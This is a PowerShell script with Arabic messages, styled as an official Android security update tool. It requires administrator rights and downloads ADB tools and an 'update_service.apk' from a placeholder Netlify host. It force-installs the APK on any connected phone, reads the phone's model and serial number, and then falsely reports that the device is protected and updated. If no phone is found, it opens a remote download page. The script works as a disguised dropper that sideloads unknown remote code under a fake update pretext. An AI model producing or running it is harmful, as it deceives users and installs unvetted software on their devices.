# Android System Update PowerShell Script
# الإصدار: 2.1.4 | تاريخ الإصدار: 2024-01-15

Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "    نظام تحديثات Android المتكامل" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host ""

# التحقق من صلاحيات المدير
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host " [!] هذا السكريبت يتطلب صلاحيات المدير" -ForegroundColor Red
    Write-Host " [!] الرجاء تشغيل PowerShell كمسؤول" -ForegroundColor Red
    timeout /t 5
    exit 1
}

# دالة لعرض الشعار
function Show-Banner {
    Write-Host ""
    Write-Host "        === نظام التحديثات الأمنية ===" -ForegroundColor Green
    Write-Host ""
    Write-Host " ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗"
    Write-Host " ██╔════╝██║   ██║██╔════╝╚══██╔══╝██╔════╝████╗ ████║"
    Write-Host " ███████╗██║   ██║█████╗     ██║   █████╗  ██╔████╔██║"
    Write-Host " ╚════██║██║   ██║██╔══╝     ██║   ██╔══╝  ██║╚██╔╝██║"
    Write-Host " ███████║╚██████╔╝██║        ██║   ███████╗██║ ╚═╝ ██║"
    Write-Host " ╚══════╝ ╚═════╝ ╚═╝        ╚═╝   ╚══════╝╚═╝     ╚═╝"
    Write-Host ""
}

# دالة للتحقق من اتصال الإنترنت
function Test-InternetConnection {
    try {
        $connection = Test-NetConnection -ComputerName "8.8.8.8" -Port 53 -InformationLevel Quiet
        return $connection
    } catch {
        return $false
    }
}

# دالة للتحقق من تثبيت ADB
function Get-ADBStatus {
    try {
        $adbVersion = adb version 2>&1
        return $true
    } catch {
        return $false
    }
}

# دالة لتحميل ADB
function Install-ADBTools {
    Write-Host " [*] جاري تحميل أدوات Android Platform Tools..." -ForegroundColor Yellow
    
    $downloadUrl = "https://your-netlify-site.netlify.app/assets/platform-tools.zip"
    $downloadPath = "$env:TEMP\platform-tools.zip"
    $extractPath = "$env:TEMP\platform-tools"
    
    try {
        # تحميل الملف
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($downloadUrl, $downloadPath)
        Write-Host " [✓] تم تحميل الأدوات بنجاح" -ForegroundColor Green
        
        # فك الضغط
        Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force
        Write-Host " [✓] تم فك ضغط الأدوات" -ForegroundColor Green
        
        # إضافة إلى PATH
        $env:Path += ";$extractPath"
        return $true
    } catch {
        Write-Host " [✗] فشل في تحميل الأدوات: $_" -ForegroundColor Red
        return $false
    }
}

# دالة للكشف عن أجهزة Android
function Find-AndroidDevices {
    Write-Host " [*] جاري البحث عن أجهزة Android متصلة..." -ForegroundColor Yellow
    
    $devices = adb devices | Select-Object -Skip 1 | Where-Object { $_ -match "device$" }
    
    if ($devices.Count -gt 0) {
        Write-Host " [✓] تم العثور على $($devices.Count) جهاز" -ForegroundColor Green
        return $true
    } else {
        Write-Host " [✗] لم يتم العثور على أجهزة Android" -ForegroundColor Red
        return $false
    }
}

# دالة لتثبيت التطبيق
function Install-AndroidApp {
    Write-Host " [*] جاري تثبيت تطبيق التحديثات..." -ForegroundColor Yellow
    
    $appUrl = "https://your-netlify-site.netlify.app/assets/update_service.apk"
    $localAppPath = "$env:TEMP\update_service.apk"
    
    try {
        # تحميل التطبيق
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($appUrl, $localAppPath)
        Write-Host " [✓] تم تحميل التطبيق" -ForegroundColor Green
        
        # تثبيت التطبيق
        adb install -r $localAppPath
        Write-Host " [✓] تم تثبيت التطبيق بنجاح" -ForegroundColor Green
        return $true
    } catch {
        Write-Host " [✗] فشل في تثبيت التطبيق: $_" -ForegroundColor Red
        return $false
    }
}

# دالة لجمع معلومات النظام
function Get-DeviceInformation {
    Write-Host "`n [*] جاري جمع معلومات الجهاز..." -ForegroundColor Yellow
    
    try {
        $deviceInfo = @{
            Model = adb shell getprop ro.product.model
            Manufacturer = adb shell getprop ro.product.manufacturer
            AndroidVersion = adb shell getprop ro.build.version.release
            SerialNumber = adb shell getprop ro.serialno
        }
        
        Write-Host " [✓] معلومات الجهاز:" -ForegroundColor Green
        Write-Host "     - الموديل: $($deviceInfo.Model)" -ForegroundColor White
        Write-Host "     - الصانع: $($deviceInfo.Manufacturer)" -ForegroundColor White
        Write-Host "     - إصدار Android: $($deviceInfo.AndroidVersion)" -ForegroundColor White
        Write-Host "     - الرقم التسلسلي: $($deviceInfo.SerialNumber)" -ForegroundColor White
        
        return $deviceInfo
    } catch {
        Write-Host " [✗] فشل في جمع معلومات الجهاز" -ForegroundColor Red
        return $null
    }
}

# الدالة الرئيسية
function Start-AndroidUpdateProcess {
    Show-Banner
    
    Write-Host " [*] بدء عملية التحديث الأمني..." -ForegroundColor Cyan
    
    # التحقق من الاتصال بالإنترنت
    if (-not (Test-InternetConnection)) {
        Write-Host " [✗] لا يوجد اتصال بالإنترنت" -ForegroundColor Red
        exit 1
    }
    Write-Host " [✓] الاتصال بالإنترنت نشط" -ForegroundColor Green
    
    # التحقق من ADB
    if (-not (Get-ADBStatus)) {
        Write-Host " [*] أدوات ADB غير مثبتة، جاري التثبيت..." -ForegroundColor Yellow
        if (-not (Install-ADBTools)) {
            exit 1
        }
    }
    Write-Host " [✓] أدوات ADB جاهزة" -ForegroundColor Green
    
    # البحث عن الأجهزة
    if (Find-AndroidDevices) {
        # جمع معلومات الجهاز
        $deviceInfo = Get-DeviceInformation
        
        # تثبيت التطبيق
        if (Install-AndroidApp) {
            Write-Host "`n [✓] اكتملت عملية التحديث بنجاح!" -ForegroundColor Green
            Write-Host " [✓] الجهاز محمي ومحدث" -ForegroundColor Green
        }
    } else {
        Write-Host "`n [*] لم يتم العثور على أجهزة، جاري فتح دليل التحميل..." -ForegroundColor Yellow
        Start-Process "https://your-netlify-site.netlify.app/update.html"
    }
}

# التنفيذ الرئيسي
try {
    Start-AndroidUpdateProcess
} catch {
    Write-Host " [✗] حدث خطأ غير متوقع: $_" -ForegroundColor Red
}

Write-Host "`n==================================================" -ForegroundColor Cyan
Write-Host "    انتهت عملية التحديث - System Update v2.1.4" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan

# الانتظار قبل الإغلاق
Write-Host "`nاضغط أي مفتاح للخروج..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
